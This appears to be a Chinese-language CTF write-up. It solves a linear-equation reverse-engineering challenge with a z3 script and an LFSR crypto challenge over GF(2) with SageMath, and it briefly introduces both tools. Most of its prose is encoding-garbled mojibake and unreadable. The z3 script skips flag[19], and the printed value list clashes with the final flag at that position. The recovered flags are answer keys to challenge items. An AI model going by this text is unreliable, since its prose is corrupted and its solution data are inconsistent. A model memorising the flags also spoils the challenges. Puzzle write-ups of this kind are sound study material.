çœ‹ä¸€çœ‹ï¼Œé¦–å…ˆå°†è¾“å…¥çš„ flag åˆ†åˆ«å­˜æ”¾åœ¨ v46 åˆ° v87 å˜é‡å†…ï¼Œè€Œåæ˜¯è¿™äº›å˜é‡ç»„æˆçš„çº¿æ€§æ–¹ç¨‹ï¼Œæœ€åä¸ Dst çš„ç»“æœæ¯”è¾ƒï¼Œæ­£ç¡®åˆ™è¾“å‡º winã€‚ å…¶ä¸­DståŠå…¶ä¹‹åå¯¹åº”çš„é‚£éƒ¨åˆ†ç©ºé—´å°±æ˜¯æ–¹ç¨‹çš„å€¼ï¼Œå°†æ•°æ®æŠ å‡ºæ¥æ±‚è§£å°±å®Œäº‹äº†ï¼ æœ¬æ¥æƒ³ç”¨ MATLAB ä¹‹ç±»æ¥æ±‚è§£çš„ï¼Œä½†çœ‹åˆ°é¢˜ç›®åå­—å« z3ï¼Œæœäº†ä¸€ä¸‹ï¼Œæœç„¶æœ‰ä¸ªå« z3 çš„æ±‚è§£å™¨ï¼Œäºæ˜¯ç›´æ¥ç”¨å®ƒæ¥çº¦æŸæ±‚è§£å³å¯ã€‚ è€Œä¸”è¿™ä¸ª z3 è¿˜æŒºå¼ºå¤§çš„äºšå­ã€‚ã€‚ from z3 import * solver = Solver() v46 = Int('flag[0]') v47 = Int('flag[1]') v48 = Int('flag[2]') v49 = Int('flag[3]') v50 = Int('flag[4]') v51 = Int('flag[5]') v52 = Int('flag[6]') v53 = Int('flag[7]') v54 = Int('flag[8]') v55 = Int('flag[9]') v56 = Int('flag[10]') v57 = Int('flag[11]') v58 = Int('flag[12]') v59 = Int('flag[13]') v60 = Int('flag[14]') v61 = Int('flag[15]') v62 = Int('flag[16]') v63 = Int('flag[17]') v64 = Int('flag[18]') v65 = Int('flag[20]') v66 = Int('flag[21]') v67 = Int('flag[22]') v68 = Int('flag[23]') v69 = Int('flag[24]') v70 = Int('flag[25]') v71 = Int('flag[26]') v72 = Int('flag[27]') v73 = Int('flag[28]') v74 = Int('flag[29]') v75 = Int('flag[30]') v76 = Int('flag[31]') v77 = Int('flag[32]') v78 = Int('flag[33]') v79 = Int('flag[34]') v80 = Int('flag[35]') v81 = Int('flag[36]') v82 = Int('flag[37]') v83 = Int('flag[38]') v84 = Int('flag[39]') v85 = Int('flag[40]') v86 = Int('flag[41]') v87 = Int('flag[42]') solver.add(v46 &gt; 0) solver.add(v46 &lt; 128) solver.add(v47 &gt; 0) solver.add(v47 &lt; 128) solver.add(v48 &gt; 0) solver.add(v48 &lt; 128) solver.add(v77 &gt; 0) solver.add(v77 &lt; 128) solver.add(v78 &gt; 0) solver.add(v78 &lt; 128) solver.add(v79 &gt; 0) solver.add(v79 &lt; 128) solver.add(v76 &gt; 0) solver.add(v76 &lt; 128) solver.add(34 * v49 + 12 * v46 + 53 * v47 + 6 * v48 + 58 * v50 + 36 * v51 + v52 == 0x4f17) solver.add(27 * v50 + 73 * v49 + 12 * v48 + 83 * v46 + 85 * v47 + 96 * v51 + 52 * v52 == 0x9cf6) solver.add(24 * v48 + 78 * v46 + 53 * v47 + 36 * v49 + 86 * v50 + 25 * v51 + 46 * v52 == 0x8ddb) solver.add(78 * v47 + 39 * v46 + 52 * v48 + 9 * v49 + 62 * v50 + 37 * v51 + 84 * v52 == 0x8ea6) solver.add(48 * v50 + 14 * v48 + 23 * v46 + 6 * v47 + 74 * v49 + 12 * v51 + 83 * v52 == 0x6929) solver.add(15 * v51 + 48 * v50 + 92 * v48 + 85 * v47 + 27 * v46 + 42 * v49 + 72 * v52 == 0x9911) solver.add(26 * v51 + 67 * v49 + 6 * v47 + 4 * v46 + 3 * v48 + 68 * v52 == 0x40a2) solver.add(34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59 == 0x2f3e) solver.add(27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59 == 0x62b6) solver.add(24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59 == 0x4b82) solver.add(78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59 == 0x486c) solver.add(48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59 == 0x4002) solver.add(15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59 == 0x52d7) solver.add(26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59 == 0x2def) solver.add(34 * v63 + 12 * v60 + 53 * v61 + 6 * v62 + 58 * v64 + 36 * v65 + v66 == 0x28dc) solver.add(27 * v64 + 73 * v63 + 12 * v62 + 83 * v60 + 85 * v61 + 96 * v65 + 52 * v66 == 0x640d) solver.add(24 * v62 + 78 * v60 + 53 * v61 + 36 * v63 + 86 * v64 + 25 * v65 + 46 * v66 == 0x528f) solver.add(78 * v61 + 39 * v60 + 52 * v62 + 9 * v63 + 62 * v64 + 37 * v65 + 84 * v66 == 0x613b) solver.add(48 * v64 + 14 * v62 + 23 * v60 + 6 * v61 + 74 * v63 + 12 * v65 + 83 * v66 == 0x4781) solver.add(15 * v65 + 48 * v64 + 92 * v62 + 85 * v61 + 27 * v60 + 42 * v63 + 72 * v66 == 0x6b17) solver.add(26 * v65 + 67 * v63 + 6 * v61 + 4 * v60 + 3 * v62 + 68 * v66 == 0x3237) solver.add(34 * v70 + 12 * v67 + 53 * v68 + 6 * v69 + 58 * v71 + 36 * v72 + v73 == 0x2a93) solver.add(27 * v71 + 73 * v70 + 12 * v69 + 83 * v67 + 85 * v68 + 96 * v72 + 52 * v73 == 0x615f) solver.add(24 * v69 + 78 * v67 + 53 * v68 + 36 * v70 + 86 * v71 + 25 * v72 + 46 * v73 == 0x50be) solver.add(78 * v68 + 39 * v67 + 52 * v69 + 9 * v70 + 62 * v71 + 37 * v72 + 84 * v73 == 0x598e) solver.add(48 * v71 + 14 * v69 + 23 * v67 + 6 * v68 + 74 * v70 + 12 * v72 + 83 * v73 == 0x4656) solver.add(15 * v72 + 48 * v71 + 92 * v69 + 85 * v68 + 27 * v67 + 42 * v70 + 72 * v73 == 0x5b31) solver.add(26 * v72 + 67 * v70 + 6 * v68 + 4 * v67 + 3 * v69 + 68 * v73 == 0x313a) solver.add(34 * v77 + 12 * v74 + 53 * v75 + 6 * v76 + 58 * v78 + 36 * v79 + v80 == 0x3010) solver.add(27 * v78 + 73 * v77 + 12 * v76 + 83 * v74 + 85 * v75 + 96 * v79 + 52 * v80 == 0x67fe) solver.add(24 * v76 + 78 * v74 + 53 * v75 + 36 * v77 + 86 * v78 + 25 * v79 + 46 * v80 == 0x4d5f) solver.add(78 * v75 + 39 * v74 + 52 * v76 + 9 * v77 + 62 * v78 + 37 * v79 + 84 * v80 == 0x58db) solver.add(48 * v78 + 14 * v76 + 23 * v74 + 6 * v75 + 74 * v77 + 12 * v79 + 83 * v80 == 0x3799) solver.add(15 * v79 + 48 * v78 + 92 * v76 + 85 * v75 + 27 * v74 + 42 * v77 + 72 * v80 == 0x60a0) solver.add(26 * v79 + 67 * v77 + 6 * v75 + 4 * v74 + 3 * v76 + 68 * v80 == 0x2750) solver.add(34 * v84 + 12 * v81 + 53 * v82 + 6 * v83 + 58 * v85 + 36 * v86 + v87 == 0x3759) solver.add(27 * v85 + 73 * v84 + 12 * v83 + 83 * v81 + 85 * v82 + 96 * v86 + 52 * v87 == 0x8953) solver.add(24 * v83 + 78 * v81 + 53 * v82 + 36 * v84 + 86 * v85 + 25 * v86 + 46 * v87 == 0x7122) solver.add(78 * v82 + 39 * v81 + 52 * v83 + 9 * v84 + 62 * v85 + 37 * v86 + 84 * v87 == 0x81f9) solver.add(48 * v85 + 14 * v83 + 23 * v81 + 6 * v82 + 74 * v84 + 12 * v86 + 83 * v87 == 0x5524) solver.add(15 * v86 + 48 * v85 + 92 * v83 + 85 * v82 + 27 * v81 + 42 * v84 + 72 * v87 == 0x8971) solver.add(26 * v86 + 67 * v84 + 6 * v82 + 4 * v81 + 3 * v83 + 68 * v87 == 0x3a1d) if(solver.check()): print(solver.model()) å¾—åˆ°ç»“æœä¸ºï¼š [flag[8] = 55, flag[3] = 103, flag[1] = 108, flag[16] = 98, flag[15] = 51, flag[26] = 57, flag[11] = 52, flag[18] = 45, flag[9] = 49, flag[24] = 45, flag[22] = 49, flag[30] = 54, flag[14] = 54, flag[0] = 102, flag[25] = 57, flag[40] = 52, flag[10] = 100, flag[20] = 52, flag[23] = 56, flag[37] = 102, flag[39] = 54, flag[41] = 56, flag[7] = 49, flag[17] = 57, flag[4] = 123, flag[29] = 45, flag[2] = 97, flag[33] = 52, flag[5] = 55, flag[36] = 97, flag[12] = 51, flag[38] = 101, flag[27] = 48, flag[32] = 49, flag[31] = 101, flag[34] = 99, flag[42] = 125, flag[35] = 50, flag[28] = 101, flag[21] = 101, flag[13] = 45, flag[6] = 101] å³ [102, 108, 97, 103, 123, 55, 101, 49, 55, 49, 100, 52, 51, 45, 54, 51, 98, 57, 45, 1, 52, 101, 49, 56, 45, 57, 57, 48, 101, 45, 54, 101, 49, 52, 99, 50, 97, 102, 101, 54, 52, 56, 125] è€Œååˆ©ç”¨ chr æŠŠæ•°å­—è½¬æ¢ä¸ºå­—ç¬¦å³å¯å¾—åˆ° flagã€‚ flag{7e171d43-63b9-4e18-990e-6e14c2afe648} Z3 Introductionç®€ä»‹ Z3 is a theorem prover from Microsoft Research. It is licensed under the MIT license. If you are not familiar with Z3, you can start here. Pre-built binaries for stable and nightly releases are available from here. Z3 can be built using Visual Studio, a Makefile or using CMake. It provides bindings for several programming languages. See the release notes for notes on various stable releases of Z3. Z3 åœ¨å·¥ä¸šåº”ç”¨ä¸­å®é™…ä¸Šå¸¸è§äºè½¯ä»¶éªŒè¯ã€ç¨‹åºåˆ†æç­‰ã€‚ç„¶è€Œç”±äºåŠŸèƒ½å®åœ¨å¼ºå¤§ï¼Œä¹Ÿè¢«ç”¨äºå¾ˆå¤šå…¶ä»–é¢†åŸŸã€‚CTF é¢†åŸŸæ¥è¯´ï¼Œèƒ½å¤Ÿç”¨çº¦æŸæ±‚è§£å™¨æå®šçš„é—®é¢˜å¸¸è§äºå¯†ç é¢˜ã€äºŒè¿›åˆ¶é€†å‘ã€ç¬¦å·æ‰§è¡Œã€Fuzzing æ¨¡ç³Šæµ‹è¯•ç­‰ã€‚æ­¤å¤–ï¼Œè‘—åçš„äºŒè¿›åˆ¶åˆ†ææ¡†æ¶ angr ä¹Ÿå†…ç½®äº†ä¸€ä¸ªä¿®æ”¹ç‰ˆçš„ Z3ã€‚ GitHub repo: https://github.com/Z3Prover/z3 Z3 - Slides: https://github.com/Z3Prover/z3/wiki/Slides Z3 - guide ( English ): https://rise4fun.com/z3/tutorialcontent/guide Z3 API/å‡½æ•°æ¥å£: http://z3prover.github.io/api/html/index.html ï¼ˆPython çš„ Z3 æ¥å£æ–‡æ¡£ï¼Œguide-examplesï¼‰ æ®è¯´å®ƒå¯ä»¥è§£å†³æ‰€æœ‰çš„æ–¹ç¨‹ï¼Œå½“ç„¶å¦‚æœæœ‰è§£çš„è¯ã€‚æ„Ÿè§‰å°±è´¼å¼ºå¤§ã€‚ å¾®è½¯çˆ¸çˆ¸è¿˜æ˜¯å¼ºå•Šï¼ˆ å®‰è£…è¿™é‡Œå°±ä»¥ python3 ä¸ºä¾‹äº†ã€‚ pip3 install z3-solver æ³¨æ„è¿™é‡Œä¸æ˜¯ pip install z3ï¼ï¼ï¼ï¼ˆæ˜¯æˆ‘äº†å˜¤å˜¤å˜¤ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ pip é‡Œçš„ z3 æ˜¯ä»€ä¹ˆç©æ„ ä½¿ç”¨ä¸‰æ­¥èµ°ï¼š å®šä¹‰æœªçŸ¥é‡ æ·»åŠ çº¦æŸæ¡ä»¶ æ±‚è§£ æ³¨æ„ï¼šå¦‚æœæ–¹ç¨‹æœ‰å¤šç»„è§£ï¼Œz3 åªä¼šç»™å‡ºå…¶ä¸­çš„ä¸€ç»„è§£ï¼Œå› æ­¤å¯ä»¥å°è¯•ä¸ºæ–¹ç¨‹æ·»åŠ çº¦æŸæ¡ä»¶ï¼Œè¿›ä¸€æ­¥é™åˆ¶è§£çš„èŒƒå›´ï¼Œä»è€Œè·å¾—é¢„æœŸçš„ä¸€ç»„è§£ Example: é¦–å…ˆçœ‹æœ€ç®€å•çš„ä¾‹å­ã€‚ from z3 import * x = Int('x') y = Int('y') solve(x &gt; 2, y &lt; 10, x + 2*y == 7) è¿è¡Œå¾—åˆ° [y = 0, x = 7] å†æ¥çœ‹ç¨å¾®å¤æ‚ä¸€ç‚¹çš„ã€‚ å˜é‡ç±»å‹å¸¸ç”¨çš„åŒ…æ‹¬ Intå‹ï¼ˆæ•´æ•°ï¼‰ï¼ŒRealå‹ï¼ˆæœ‰ç†æ•°ï¼‰ï¼ŒBitVecå‹ï¼ˆä½å‘é‡ï¼‰ã€‚ è§£å¸¸ç”¨çš„æ–¹ç¨‹ä¸€èˆ¬æ˜¯ç”¨ Intå‹ï¼Œåœ¨æ±‚è§£ä½è¿ç®—ï¼ˆå¦‚&amp;, ^, |, &gt;&gt;, &lt;&lt; è¿™äº›ï¼‰ç”¨ BitVecå‹å°±å¾ˆæ–¹ä¾¿ï¼ŒåŒ…æ‹¬ä¸‹é¢çš„ LFSR ä¹Ÿå¯ä»¥ç”¨åˆ°ã€‚ æ±‚è§£æ–¹ç¨‹ç»„çš„è¯ï¼Œéœ€è¦å…ˆåˆå§‹åŒ–ä¸€ä¸ªSolverï¼ˆçº¦æŸæ±‚è§£å™¨ï¼‰ï¼Œ ç„¶ååˆ©ç”¨ add æ–¹æ³•ä¾æ¬¡å¾€é‡Œé¢åŠ å…¥æ–¹ç¨‹ã€‚ å…¶æ¬¡åˆ¤æ–­è§£æ˜¯å¦å­˜åœ¨ if solver.check() == sat: æœ€åæ±‚è§£ print(solver.model()) from z3 import * x, y, z = Ints('x y z') # å¯ä»¥åŒæ—¶å®šä¹‰å¤šä¸ªå˜é‡ s = Solver() s.add('EQU1') s.add('EQU2') s.add('EQU3') if solver.check() == sat: print(solver.model()) è¿™é“é¢˜é‡Œå°±ç”¨äº†è¿™ä¸€æ–¹æ³•æ¥æ±‚è§£ã€‚ å¤§æ¦‚å…ˆå†™è¿™ä¹ˆå¤šï¼Œå…¶ä»–çš„è¿˜å¾—æ…¢æ…¢å­¦ï¼Œå¯ä»¥å‚è€ƒä¸‹æœ€åçš„æ‹“å±•é˜…è¯»å–µ~ LFSRé¢˜ç›®æ‰€ç»™ä»£ç å¦‚ä¸‹ã€‚ import random from secret import flag N = 100 MASK = 2**(N+1) - 1 def lfsr(state, mask): feedback = state &amp; mask feed_bit = bin(feedback)[2:].count(\"1\") &amp; 1 output_bit = state &amp; 1 state = (state &gt;&gt; 1) | (feed_bit &lt;&lt; (N-1)) return state, output_bit def main(): assert flag.startswith(\"flag{\") assert flag.endswith(\"}\") mask = int(flag[5:-1]) assert mask.bit_length() == N state = random.randint(0, MASK) print(state) outputs = '' for _ in range(N**2): state, output_bit = lfsr(state, mask) outputs += str(output_bit) with open(\"output.txt\", \"w\") as f: f.write(outputs) main() è¿™é¢˜è®©æˆ‘æƒ³èµ·äº†è¿™å­¦æœŸå«æ˜Ÿå¯¼èˆªè¯¾åšçš„å®éªŒï¼Œè®©æˆ‘ä»¬åˆ©ç”¨ä¸åŒæŠ½å¤´çš„ç§»ä½å¯„å­˜å™¨ç”Ÿæˆä¼ªéšæœºåºåˆ—ï¼Œè¿˜æœ‰måºåˆ—ä»€ä¹ˆçš„ã€‚ måºåˆ—æ˜¯æœ€é•¿çº¿æ€§ç§»ä½å¯„å­˜å™¨åºåˆ—çš„ç®€ç§°ï¼Œæ˜¯ä¸€ç§ä¼ªéšæœºåºåˆ—ã€ä¼ªå™ªå£°(PN)ç æˆ–ä¼ªéšæœºç ã€‚å¯ä»¥é¢„å…ˆç¡®å®šå¹¶ä¸”å¯ä»¥é‡å¤å®ç°çš„åºåˆ—ç§°ä¸ºç¡®å®šåºåˆ—ï¼›æ—¢ä¸èƒ½é¢„å…ˆç¡®å®šåˆä¸èƒ½é‡å¤å®ç°çš„åºåˆ—ç§°éšæœºåºåˆ—ï¼›ä¸èƒ½é¢„å…ˆç¡®å®šä½†å¯ä»¥é‡å¤äº§ç”Ÿçš„åºåˆ—ç§°ä¼ªéšæœºåºåˆ—ã€‚ å®ƒæ˜¯ç”±å¸¦çº¿æ€§åé¦ˆçš„ç§»å­˜å™¨äº§ç”Ÿçš„å‘¨æœŸæœ€é•¿çš„åºåˆ—ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªnçº§çº¿æ€§åé¦ˆç§»å­˜å™¨å¯èƒ½äº§ç”Ÿçš„æœ€é•¿å‘¨æœŸç­‰äº(2^n -1)ã€‚ åœ¨é€šä¿¡é¢†åŸŸæœ‰ç€å¹¿æ³›çš„åº”ç”¨ï¼Œå¦‚æ‰©é¢‘é€šä¿¡ã€å«æ˜Ÿé€šä¿¡çš„ç åˆ†å¤šå€ï¼ˆCDMAï¼‰ï¼Œæ•°å­—æ•°æ®ä¸­çš„åŠ å¯†ã€åŠ æ‰°ã€åŒæ­¥ã€è¯¯ç ç‡æµ‹é‡ç­‰é¢†åŸŸã€‚ Via Baidu baike çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆlinear feedback shift register, LFSRï¼‰æ˜¯æŒ‡ï¼Œç»™å®šå‰ä¸€çŠ¶æ€çš„è¾“å‡ºï¼Œå°†è¯¥è¾“å‡ºçš„çº¿æ€§å‡½æ•°å†ç”¨ä½œè¾“å…¥çš„ç§»ä½å¯„å­˜å™¨ã€‚å¼‚æˆ–è¿ç®—æ˜¯æœ€å¸¸è§çš„å•æ¯”ç‰¹çº¿æ€§å‡½æ•°ï¼šå¯¹å¯„å­˜å™¨çš„æŸäº›ä½è¿›è¡Œå¼‚æˆ–æ“ä½œåä½œä¸ºè¾“å…¥ï¼Œå†å¯¹å¯„å­˜å™¨ä¸­çš„å„æ¯”ç‰¹è¿›è¡Œæ•´ä½“ç§»ä½ã€‚ å½“æ—¶ç”±äºNè¾ƒå°ï¼Œç›´æ¥å°±ç”¨åˆ—è¡¨æ¥å†™äº†ï¼Œå°±æ˜¯æœ‰ç‚¹ä¸‘ï¼Œåæ¥æƒ³æƒ³å¯ä»¥ç”¨ç§»ä½æ¥å®ç°ã€‚çœ‹äº†é¢˜ç›®é‡Œé¢çš„ def lfsr(state, mask) è¿™ä¸€å‡½æ•°ï¼Œå‘ç°å†™çš„å°±å¾ˆå¦™å•Šã€‚ å½“ç„¶è¿˜æœ‰è¿™æ ·çš„ï¼ˆ2018 å¼ºç½‘æ¯ streamgame1ï¼Œ2018 å›½èµ› oldstreamgameï¼‰ def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffff i=(R&amp;mask)&amp;0xffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit) è¯è¯´å›æ¥ï¼Œå¯¹äºè¿™é¢˜è€Œè¨€ï¼Œåˆ†æå¯çŸ¥ï¼Œflag æ‹¬å·å†…çš„å­—ç¬¦æ˜¯äºŒè¿›åˆ¶ä½æ•°ä¸º100ä½çš„æ•´æ•°ã€‚è€ƒè™‘åˆ°è¿™é¢˜æŠŠ flag ä½œä¸º mask è€Œä¸æ˜¯åˆå§‹çš„çŠ¶æ€ stateï¼Œä¸”åˆå§‹ state æ˜¯éšæœºç»™å®šçš„æ•´æ•°ï¼ŒLFSR å¾—åˆ°çš„ä¼ªéšæœºåºåˆ—æœ€å¤§é‡å¤å‘¨æœŸä¸º $2^{100}-1$ï¼Œçˆ†ç ´æ±‚è§£æ— æ³•è§£å‡ºã€‚ åˆ†æ LFSR çš„é€»è¾‘å¯çŸ¥ï¼Œlfsr å‡½æ•°å†…çš„è¾“å‡ºä½ $output bit = m_0x_0 + m_1x_1 + â€¦ + m_{99}x_{99}$ï¼ˆæ¨¡äºŒå’Œï¼‰ï¼Œç”±äºè¿™æ˜¯ä¸€ä¸ªçº¿æ€§çš„æ–¹ç¨‹ï¼Œäºæ˜¯å¯ä»¥é€šè¿‡æ±‚è§£100ä¸ªæ–¹ç¨‹å¾—åˆ°å¯¹åº”çš„ç³»æ•°mï¼Œä¹Ÿå°±å¾—åˆ°äº† flagã€‚ Exp output = \"0100110011101111011111011010100111001010010100001111110110111101011110011111010010010111011100110111011001100001010010011101101000110110000011111011110000010100001001000011001011011011011001111110101111001010011011100010011110101100100101111001011100011110111101001010000000100100000111100101100100100000100110001111110011100110101000110100011001110110000110111111010111000001101110011001101111010110101000101011110111001011001111111000100100100011100100010101001100111011101111100110101011101101001001110010111011010011111001100001111111100001000001101101000001010100110011001101000101001010001001011000010111111100101111000000101000010110100110101001001100100011000111101000110011110101101111100110101010101000000001110010101001001111101001010111011110110001100101001111110111000110101011011010110101100011110010000011000110010111101010010000011101110111100011011110110001111010101011101100101101001111100100011000100101111011110001111100000110111000111111000111100000110011011011111110011111100010010110000010011100001010101011011101100011001100101100011001010010001101010011000000011110110111000000110001010010111110101011100000010100100001101011010101100110000101100010001010010111011000100001000001001110101011000010111000000010101100001010000010110110000111100011011000010111001111101110111010110000011001011101100000100000100010100100000010011010000111110010001111010000100011110000101111000110100010110101110001011101101100111000001110100100000000010011001110101110000001101100000001010111010011111000101101011001010011001101000111000010111111010101000011011001001110000011100100100010110101100001110110111001000001011111100101100011010010010110000011110100110000111011011010101110101001100110100101100101000100011001011000001011110010000011000110111011110011010001101100010010111110101101101110100111010000001101000011011010011110111101000000100011000000101001000000011010101010000100001110110000110011000111101011100100101111101111111110101000011010001101100010010100111000000010000101100100110101000001001011100011111001101001101100010100000111010101111011101111111101100000010000111110011101010100101110100101010100011110100100000111010001000100011010011100010011000001110110100110110010100100110111011001010010010100000110101110000011110010110100010101000110000111101011011010111101100111100101001101001101100111101000100101101100010111010010111100100111101101110101110011010110011111011111010000011000100010010101110001001000111111100100010100000001001010111010100010111001011011101110010110111110110100011111101110111011000111001010010110001001011011100110101111100100000101110000001011110011101110101101001011111100011001100111001011011001011011101000101100100011101000011101011010110010111111010011110111111111100001101101001101101111000100110010010100000100000100110100100110010000100101100000101010101000111110101001111111011011111101101110010100110000010110111001101110011101100001111111001110110010010011101111100111111000010011010010011100000001010011111111110001111110110110110001001001111011001101110110101100011010001111110010001011010000011110101100110010010001110010100010000000010101010010111011010101011011000010010011010110101101011100100101110001100000111110010101100010100010100010000101111000011111000111000011110001110110000011000100110010101111111111100011010000010010010111111110000000010100100101101101010111011000001010000000101011010110011101000110011011001110101101001001101100010011110001101001001000011001101100001101100000101111000001110100001100001000100000000011010011001001011110011000011011000100011011001011100111111000011011010000100000011110110011011110111000001011101101110110101000101011111110000100000111111110011111111100010101001000011010001110111111011100010111001110110001000101010001001001111111110111001101001001000110000110100000000010010100001010111101001110001011101011000100000001001001011111000100011111000011010001110001111111110111100010001110101011101011100010100000011110000100011001100000100111000111011011101000110010011010011110010010000111010001011111111010110011100111011110100111000101100100111001001010001000100011110101100100010000000000110010111101101111101011001101111000000000100000101001011110000010011110011000000100111001001110001000010011111010100001001010010100111111010111001001110110101010010100010010100101100000001010010111101101000110100111110000000111110000011110011001101010111101010111010111010000000110010001011110101110110001000110111101110101101001001100001101110001000100000110100000100000111110010110110010011111100010011111001110111011010101010001011111110000000011110001010011001101010110010101100101100110010111001100100111101000100010100010010100000010010111101100111110101101111101001010110010001111111001101010111110101111001000111101001110100000111111010000111000010101001001101100111001111111111100011010111110001101000100001010000000001101101001110001000001110010000010110001001001101010111111001001010100011011111011000011001001101000110010101000010100001001000011111001101101111011111001000010010111011010110010011010101100100000101100110110011011110000110011000000001011000111100101000011011011010010111000110101110101111100100010101010101000011000111000010001001000100110101111001001001111100110000101100010011101100001000010100010101110001111110101100101000101110000110010100101100101100101100100111111010100101010011100110100011111001000100010001101111111101011110100111001110101001101000010001011000111101110001010100101101111000110101001011101110110110110110101011010001110011111011110011010100110100111111010101111101111100110000110010111110110100110000011110110111111101111010011010000101010111100001111110110000001000001000011101001010010100100100000001101011101110011001011011110010111101111101010011010000110110101000100010110110101101010110110010011010011111111100001001000110111101001111000011001000010111100110001110110011011011100101011010101100011001111111000100000011100110011001001011000100010110000100001100011010000110110011100000111000010001011010001110010101000100010001001110001011001010000111010010101110001010100011101101110010111100010110010000011010111001101000100111011010100001010011100000100001010100010110100111000000001111100000100011100101011011101111111101101110011111010000110111101000001001110111000001000101100110100100111100100011011100010011111101010001101010100101110000110011000100001111100100001000000100011101101011011111000011110010110110101010011101000001111001011100101001001101111000011110000001010011010001110000111001101100011110011001100000111101001011000110111011001101101101100101100110100101011111111110110000111101000000100101011100111001111111011010100110010001000001101010001110010010000101111000001010100000101100000010101110100000000110011001011000011101101000000100111111010111110100011111101100001001110001100101100001010000100000110111101001101010000011100000000100000101101010010101111101100110110111000011100111001010010100101000111011001001110011111100010010010110100111101100110110111001011110010000111011111010101000010001101110011111010110011100010001111111011100110100011110110001101001110001010001110011110101111101011101100000111011011101110000110111101010001000011110011011101100011100101110100000100010110110011010101011000010010110000000100010011001110010011110010110111001111011010101111011000000111110000011011100100010011110010110000001111110111000100111010100110010111100010000110101011110011010110011001011011010010111001000000000001001010101010001100000110111101000000010100100010100101011111110011011100111101001110101010001100000100100110111110001111000011100010110001101101010011001011111101011000110110000111111101100000000001000010010010011101001000111100000010111011011001001100110000101010110001011000001011010111000111100111011010101010011100100100100010000001101001101010111110010100101000001100111110111111110000101111100110001110111010111001111110111100000111011011010111011001111010100010000111011111111000100110110001100000110101000001010010010100111011100000011111110001000010011010101001111010111100011110110110111000000111101010110001100000100001101101001101010111110001101101100101101101001000100000100110111111010011010011111010110110111101001000100010111101100011010111011111010011110000100001100101101111110010101000000101111101000001111110100000001011011111111100100110101101011100101101001011010001100010101101100000101000001110110101010100001011100010000111010011101110000000010000000000010111100111000010000000110110011011101110000001111011100011101111100011000011001000100111010101011010101110011010011011011010100011011000110111101001110011110000100010011000010000001101010010011000111000000000101100011010001000100010100100100011000101110100010001111101001010100001000000110010011101011101000000100010000011010110100111110101110001111001000000101011101010111110110100100011010000011010111111001001111101101110111110111000001010111100010001001001100000000110011100001100100111010011111011001010001101111111000010110101000011100001010110100101110111001001100000000110110101011001110000011001111100001101110100101101111100110001010011011001010110111000100010000110001111101110011100001101000100110000111000110001011011110100010101011011001001111101001110011100001110001010100011001110110101101001101010101001110011110001011101011100100001101100110110110101011101010110011100000001011010111011101000000101110111110010000000000101001110011111011001110001100010111001010010110011100001000011111101111101100111000101011100011000001100000000000010000111111010010101110101011100010100001000000100111111010111110010010111010110010100111000010111100000000100010111010010011010011001100010001000001100110100101110100110110111101010001100001010011111011100000010110110110000000100101100110100101100111001010100010001011010001010011110100110101000110001110000100111111001000110011110010111000110010001111111111101011110100111101001001101110110011111000110010111000011011111001110101101101000011010101011010111101011101111011100101001111111000101100100000011000100101001011001011110001101001100101001\" flist = [] for i in range(101): f = [] for j in output[i:i+100]: f.append(int(j)) flist.append(f) C = matrix(GF(2), flist[-1]) F = matrix(GF(2), flist[:100]) sol = F.solve_left(C) flag = \"\" for i in sol[0][::-1]: flag += str(i) print(int(flag, 2)) é¦–å…ˆæå–çº¿æ€§æ–¹ç¨‹ç³»æ•°çŸ©é˜µ F å’Œè§£çŸ©é˜µ Cï¼Œè€Œååˆ©ç”¨ SageMath æ±‚è§£æ–¹ç¨‹å³å¯ã€‚ å…¶ä¸­çš„ GF(2)ï¼ŒGF æ˜¯ Galois Field çš„ç¼©å†™ï¼Œä¸­æ–‡ç§°å…¶ä¸º GaloisåŸŸæˆ–æœ‰é™åŸŸï¼Œ GF(2)æ˜¯æœ€ç®€å•çš„æœ‰é™åŸŸï¼Œåªæœ‰0, 1äºŒå…ƒåŠ+ï¼ˆå¼‚æˆ–è¿ç®—ï¼‰ã€Ã—ï¼ˆä¸è¿ç®—ï¼‰ï¼Œå¤§æ¦‚å¯ä»¥ç†è§£ä¸ºæ¨¡äºŒè¿ç®—å§ã€‚ åœ¨çº¿ SageMathï¼š https://cocalc.com/ flag{856137228707110492246853478448} SageMath Introductionè¿™é‡Œé¡ºä¾¿æ¥ä»‹ç»ä¸€ä¸‹ SageMath è¿™ä¸€å·¥å…·å–µï¼ SageMath is a free open-source mathematics software system licensed under the GPL. It builds on top of many existing open-source packages: NumPy, SciPy, matplotlib, Sympy, Maxima, GAP, FLINT, R and many more. Access their combined power through a common, Python-based language or directly via interfaces or wrappers. Mission: Creating a viable free open source alternative to Magma, Maple, Mathematica and Matlab. SageMath æ˜¯ä¸€ä¸ªåŸºäº GPL åè®®çš„å¼€æºæ•°å­¦è½¯ä»¶ã€‚å®ƒä½¿ç”¨ Python ä½œä¸ºé€šç”¨æ¥å£ï¼Œå°†ç°æœ‰çš„è®¸å¤šå¼€æºè½¯ä»¶åŒ…æ•´åˆåœ¨ä¸€èµ·ï¼Œæ„å»ºä¸€ä¸ªç»Ÿä¸€çš„è®¡ç®—å¹³å°ã€‚ ä¸€ä¸ªæ•°å­¦æ±‚è§£è½¯ä»¶ï¼Œå¯ä»¥è§£æ–¹ç¨‹å•Š balabalaï¼Œæ„Ÿè§‰ç”¨èµ·æ¥æŒºçˆ½çš„ã€‚ å®˜ç½‘ï¼š https://www.sagemath.org/ åœ¨çº¿ç‰ˆæœ¬ï¼š https://cocalc.com/ https://sagecell.sagemath.org/ By the wayï¼Œè¿™ä¸ª CoCalc 